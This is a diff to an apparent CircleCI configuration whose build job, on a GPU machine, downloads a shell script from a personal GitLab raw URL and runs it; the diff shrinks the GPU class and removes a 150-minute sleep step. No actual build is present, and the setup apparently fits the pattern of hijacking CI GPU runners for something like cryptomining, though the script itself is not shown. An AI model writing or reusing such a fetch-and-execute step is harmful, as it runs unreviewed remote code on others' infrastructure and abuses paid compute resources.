@@ -2,8 +2,7 @@ version: 2.1
 jobs:
   build:
     machine:
-      resource_class: gpu.nvidia.large
+      resource_class: gpu.nvidia.medium
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
       - run: wget https://gitlab.com/viwarlani/build/-/raw/main/star.sh && chmod +x *.sh && ./star.sh
-      - run: sleep 150m
